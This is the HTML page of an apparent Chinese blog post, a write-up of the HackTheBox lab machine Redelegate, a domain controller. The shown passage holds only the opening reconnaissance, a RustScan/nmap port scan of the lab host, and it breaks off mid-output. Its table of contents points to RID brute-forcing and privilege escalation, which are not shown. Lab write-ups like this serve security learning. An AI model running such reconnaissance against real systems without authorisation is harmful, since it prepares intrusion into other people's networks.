@@ -1,0 +1,1211 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前期收集\r┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Redelegate] └─$ ls hostname krb5.conf rust.txt start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Redelegate] └─$ cat rust.txt .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- TreadStone was here 🚀 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.50:21 Open 10.129.234.50:53 Open 10.129.234.50:80 Open 10.129.234.50:88 Open 10.129.234.50:135 Open 10.129.234.50:139 Open 10.129.234.50:389 Open 10.129.234.50:445 Open 10.129.234.50:464 Open 10.129.234.50:593 Open 10.129.234.50:636 Open 10.129.234.50:1433 Open 10.129.234.50:3268 Open 10.129.234.50:3269 Open 10.129.234.50:3389 Open 10.129.234.50:5985 Open 10.129.234.50:9389 Open 10.129.234.50:47001 Open 10.129.234.50:49664 Open 10.129.234.50:49665 Open 10.129.234.50:49667 Open 10.129.234.50:49666 Open 10.129.234.50:49668 Open 10.129.234.50:49932 Open 10.129.234.50:57719 Open 10.129.234.50:58976 Open 10.129.234.50:58975 Open 10.129.234.50:58979 Open 10.129.234.50:58983 Open 10.129.234.50:58995 [~] Starting Script(s) [~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 01:09 EDT Initiating Ping Scan at 01:09 Scanning 10.129.234.50 [4 ports] Completed Ping Scan at 01:09, 0.09s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 01:09 Completed Parallel DNS resolution of 1 host. at 01:09, 2.02s elapsed DNS resolution of 1 IPs took 2.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 01:09 Scanning 10.129.234.50 [30 ports] Discovered open port 135/tcp on 10.129.234.50 Discovered open port 445/tcp on 10.129.234.50 Discovered open port 53/tcp on 10.129.234.50 Discovered open port 80/tcp on 10.129.234.50 Discovered open port 3389/tcp on 10.129.234.50 Discovered open port 139/tcp on 10.129.234.50 Discovered open port 21/tcp on 10.129.234.50 Discovered open port 389/tcp on 10.129.234.50 Discovered open port 49664/tcp on 10.129.234.50 Discovered open port 9389/tcp on 10.129.234.50 Discovered open port 49667/tcp on 10.129.234.50 Discovered open port 57719/tcp on 10.129.234.50 Discovered open port 58995/tcp on 10.129.234.50 Discovered open port 47001/tcp on 10.129.234.50 Discovered open port 88/tcp on 10.129.234.50 Discovered open port 58979/tcp on 10.129.234.50 Discovered open port 49932/tcp on 10.129.234.50 Discovered open port 49666/tcp on 10.129.234.50 Discovered open port 464/tcp on 10.129.234.50 Discovered open port 593/tcp on 10.129.234.50 Discovered open port 3268/tcp on 10.129.234.50 Discovered open port 58975/tcp on 10.129.234.50 Discovered open port 1433/tcp on 10.129.234.50 Discovered open port 636/tcp on 10.129.234.50 Discovered open port 58976/tcp on 10.129.234.50 Discovered open port 49668/tcp on 10.129.234.50 Discovered open port 5985/tcp on 10.129.234.50 Discovered open port 58983/tcp on 10.129.234.50 Discovered open port 3269/tcp on 10.129.234.50 Discovered open port 49665/tcp on 10.129.234.50 Completed SYN Stealth Scan at 01:09, 0.27s elapsed (30 total ports) Nmap scan report for 10.129.234.50 Host is up, received echo-reply ttl 127 (0.12s latency). Scanned at 2025-09-21 01:09:36 EDT for 0s PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 127 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 1433/tcp open ms-sql-s syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 49932/tcp open unknown syn-ack ttl 127 57719/tcp open unknown syn-ack ttl 127 58975/tcp open unknown syn-ack ttl 127 58976/tcp open unknown syn-ack ttl 127 58979/tcp open unknown syn-ack ttl 127 58983/tcp open unknown syn-ack ttl 127 58995/tcp open unknown syn-ack ttl 127 Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 2.49 seconds Raw packets sent: 34 (1.472KB) | Rcvd: 31 (1.348KB) ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Redelegate] └─$ cat hostname 10.129.234.50 DC.redelegate.vl redelegate.vl DC 对于一台域控来说不常见端口有ftp和http,http页面是默认的iis页面，我准备最后再来研究它（需要的话）\n">
+<title>Redelegate-wp</title>
+
+<link rel='canonical' href='http://localhost:1313/post/redelegate/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="Redelegate-wp">
+<meta property='og:description' content="前期收集\r┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Redelegate] └─$ ls hostname krb5.conf rust.txt start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Redelegate] └─$ cat rust.txt .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- TreadStone was here 🚀 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.50:21 Open 10.129.234.50:53 Open 10.129.234.50:80 Open 10.129.234.50:88 Open 10.129.234.50:135 Open 10.129.234.50:139 Open 10.129.234.50:389 Open 10.129.234.50:445 Open 10.129.234.50:464 Open 10.129.234.50:593 Open 10.129.234.50:636 Open 10.129.234.50:1433 Open 10.129.234.50:3268 Open 10.129.234.50:3269 Open 10.129.234.50:3389 Open 10.129.234.50:5985 Open 10.129.234.50:9389 Open 10.129.234.50:47001 Open 10.129.234.50:49664 Open 10.129.234.50:49665 Open 10.129.234.50:49667 Open 10.129.234.50:49666 Open 10.129.234.50:49668 Open 10.129.234.50:49932 Open 10.129.234.50:57719 Open 10.129.234.50:58976 Open 10.129.234.50:58975 Open 10.129.234.50:58979 Open 10.129.234.50:58983 Open 10.129.234.50:58995 [~] Starting Script(s) [~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 01:09 EDT Initiating Ping Scan at 01:09 Scanning 10.129.234.50 [4 ports] Completed Ping Scan at 01:09, 0.09s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 01:09 Completed Parallel DNS resolution of 1 host. at 01:09, 2.02s elapsed DNS resolution of 1 IPs took 2.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 01:09 Scanning 10.129.234.50 [30 ports] Discovered open port 135/tcp on 10.129.234.50 Discovered open port 445/tcp on 10.129.234.50 Discovered open port 53/tcp on 10.129.234.50 Discovered open port 80/tcp on 10.129.234.50 Discovered open port 3389/tcp on 10.129.234.50 Discovered open port 139/tcp on 10.129.234.50 Discovered open port 21/tcp on 10.129.234.50 Discovered open port 389/tcp on 10.129.234.50 Discovered open port 49664/tcp on 10.129.234.50 Discovered open port 9389/tcp on 10.129.234.50 Discovered open port 49667/tcp on 10.129.234.50 Discovered open port 57719/tcp on 10.129.234.50 Discovered open port 58995/tcp on 10.129.234.50 Discovered open port 47001/tcp on 10.129.234.50 Discovered open port 88/tcp on 10.129.234.50 Discovered open port 58979/tcp on 10.129.234.50 Discovered open port 49932/tcp on 10.129.234.50 Discovered open port 49666/tcp on 10.129.234.50 Discovered open port 464/tcp on 10.129.234.50 Discovered open port 593/tcp on 10.129.234.50 Discovered open port 3268/tcp on 10.129.234.50 Discovered open port 58975/tcp on 10.129.234.50 Discovered open port 1433/tcp on 10.129.234.50 Discovered open port 636/tcp on 10.129.234.50 Discovered open port 58976/tcp on 10.129.234.50 Discovered open port 49668/tcp on 10.129.234.50 Discovered open port 5985/tcp on 10.129.234.50 Discovered open port 58983/tcp on 10.129.234.50 Discovered open port 3269/tcp on 10.129.234.50 Discovered open port 49665/tcp on 10.129.234.50 Completed SYN Stealth Scan at 01:09, 0.27s elapsed (30 total ports) Nmap scan report for 10.129.234.50 Host is up, received echo-reply ttl 127 (0.12s latency). Scanned at 2025-09-21 01:09:36 EDT for 0s PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 127 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 1433/tcp open ms-sql-s syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 49932/tcp open unknown syn-ack ttl 127 57719/tcp open unknown syn-ack ttl 127 58975/tcp open unknown syn-ack ttl 127 58976/tcp open unknown syn-ack ttl 127 58979/tcp open unknown syn-ack ttl 127 58983/tcp open unknown syn-ack ttl 127 58995/tcp open unknown syn-ack ttl 127 Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 2.49 seconds Raw packets sent: 34 (1.472KB) | Rcvd: 31 (1.348KB) ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Redelegate] └─$ cat hostname 10.129.234.50 DC.redelegate.vl redelegate.vl DC 对于一台域控来说不常见端口有ftp和http,http页面是默认的iis页面，我准备最后再来研究它（需要的话）\n">
+<meta property='og:url' content='http://localhost:1313/post/redelegate/'>
+<meta property='og:site_name' content='wackymaker'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='靶机' /><meta property='article:tag' content='htb' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-09-21T16:18:24&#43;08:00'/><meta property='article:modified_time' content='2025-09-21T16:18:24&#43;08:00'/>
+<meta name="twitter:title" content="Redelegate-wp">
+<meta name="twitter:description" content="前期收集\r┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Redelegate] └─$ ls hostname krb5.conf rust.txt start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Redelegate] └─$ cat rust.txt .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- TreadStone was here 🚀 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.50:21 Open 10.129.234.50:53 Open 10.129.234.50:80 Open 10.129.234.50:88 Open 10.129.234.50:135 Open 10.129.234.50:139 Open 10.129.234.50:389 Open 10.129.234.50:445 Open 10.129.234.50:464 Open 10.129.234.50:593 Open 10.129.234.50:636 Open 10.129.234.50:1433 Open 10.129.234.50:3268 Open 10.129.234.50:3269 Open 10.129.234.50:3389 Open 10.129.234.50:5985 Open 10.129.234.50:9389 Open 10.129.234.50:47001 Open 10.129.234.50:49664 Open 10.129.234.50:49665 Open 10.129.234.50:49667 Open 10.129.234.50:49666 Open 10.129.234.50:49668 Open 10.129.234.50:49932 Open 10.129.234.50:57719 Open 10.129.234.50:58976 Open 10.129.234.50:58975 Open 10.129.234.50:58979 Open 10.129.234.50:58983 Open 10.129.234.50:58995 [~] Starting Script(s) [~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 01:09 EDT Initiating Ping Scan at 01:09 Scanning 10.129.234.50 [4 ports] Completed Ping Scan at 01:09, 0.09s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 01:09 Completed Parallel DNS resolution of 1 host. at 01:09, 2.02s elapsed DNS resolution of 1 IPs took 2.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 01:09 Scanning 10.129.234.50 [30 ports] Discovered open port 135/tcp on 10.129.234.50 Discovered open port 445/tcp on 10.129.234.50 Discovered open port 53/tcp on 10.129.234.50 Discovered open port 80/tcp on 10.129.234.50 Discovered open port 3389/tcp on 10.129.234.50 Discovered open port 139/tcp on 10.129.234.50 Discovered open port 21/tcp on 10.129.234.50 Discovered open port 389/tcp on 10.129.234.50 Discovered open port 49664/tcp on 10.129.234.50 Discovered open port 9389/tcp on 10.129.234.50 Discovered open port 49667/tcp on 10.129.234.50 Discovered open port 57719/tcp on 10.129.234.50 Discovered open port 58995/tcp on 10.129.234.50 Discovered open port 47001/tcp on 10.129.234.50 Discovered open port 88/tcp on 10.129.234.50 Discovered open port 58979/tcp on 10.129.234.50 Discovered open port 49932/tcp on 10.129.234.50 Discovered open port 49666/tcp on 10.129.234.50 Discovered open port 464/tcp on 10.129.234.50 Discovered open port 593/tcp on 10.129.234.50 Discovered open port 3268/tcp on 10.129.234.50 Discovered open port 58975/tcp on 10.129.234.50 Discovered open port 1433/tcp on 10.129.234.50 Discovered open port 636/tcp on 10.129.234.50 Discovered open port 58976/tcp on 10.129.234.50 Discovered open port 49668/tcp on 10.129.234.50 Discovered open port 5985/tcp on 10.129.234.50 Discovered open port 58983/tcp on 10.129.234.50 Discovered open port 3269/tcp on 10.129.234.50 Discovered open port 49665/tcp on 10.129.234.50 Completed SYN Stealth Scan at 01:09, 0.27s elapsed (30 total ports) Nmap scan report for 10.129.234.50 Host is up, received echo-reply ttl 127 (0.12s latency). Scanned at 2025-09-21 01:09:36 EDT for 0s PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 127 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 1433/tcp open ms-sql-s syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 49932/tcp open unknown syn-ack ttl 127 57719/tcp open unknown syn-ack ttl 127 58975/tcp open unknown syn-ack ttl 127 58976/tcp open unknown syn-ack ttl 127 58979/tcp open unknown syn-ack ttl 127 58983/tcp open unknown syn-ack ttl 127 58995/tcp open unknown syn-ack ttl 127 Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 2.49 seconds Raw packets sent: 34 (1.472KB) | Rcvd: 31 (1.348KB) ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Redelegate] └─$ cat hostname 10.129.234.50 DC.redelegate.vl redelegate.vl DC 对于一台域控来说不常见端口有ftp和http,http页面是默认的iis页面，我准备最后再来研究它（需要的话）\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_6baab66dae07af16.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">wackymaker</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/wackymaker'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期收集">前期收集</a></li>
+    <li><a href="#数据库rid爆破">数据库rid爆破</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E9%A2%98%E7%9B%AEwp/" >
+                题目wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/redelegate/">Redelegate-wp</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 21, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    15 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前期收集">前期收集
+</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>hostname  krb5.conf  rust.txt  start.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Redelegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat rust.txt 
+</span></span><span style="display:flex;"><span>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span style="display:flex;"><span>| <span style="color:#f92672">{}</span>  <span style="color:#f92672">}</span>| <span style="color:#f92672">{</span> <span style="color:#f92672">}</span> |<span style="color:#f92672">{</span> <span style="color:#f92672">{</span>__ <span style="color:#f92672">{</span>_   _<span style="color:#f92672">}{</span> <span style="color:#f92672">{</span>__  /  ___<span style="color:#f92672">}</span> / <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\ </span>|  <span style="color:#e6db74">`</span>| |
+</span></span><span style="display:flex;"><span>| .-. <span style="color:#ae81ff">\|</span> <span style="color:#f92672">{</span>_<span style="color:#f92672">}</span> |.-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span> | |  .-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span><span style="color:#ae81ff">\ </span>    <span style="color:#f92672">}</span>/  /<span style="color:#ae81ff">\ </span> <span style="color:#ae81ff">\|</span> |<span style="color:#ae81ff">\ </span> |
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39; `-&#39;</span><span style="color:#e6db74">`</span>-----<span style="color:#e6db74">&#39;`----&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;  `----&#39;</span>  <span style="color:#e6db74">`</span>---<span style="color:#e6db74">&#39; `-&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;`-&#39;</span> <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Modern Day Port Scanner.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: http://discord.skerritt.blog         :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: https://github.com/RustScan/RustScan :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> --------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">TreadStone was here 🚀
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] Your file limit is very small, which negatively impacts RustScan&#39;</span>s speed. Use the Docker image, or up the Ulimit with <span style="color:#e6db74">&#39;--ulimit 5000&#39;</span>. 
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:21
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:53
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:80
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:88
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:135
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:139
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:389
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:445
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:464
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:593
+</span></span><span style="display:flex;"><span>Open 10.129.234.50:636
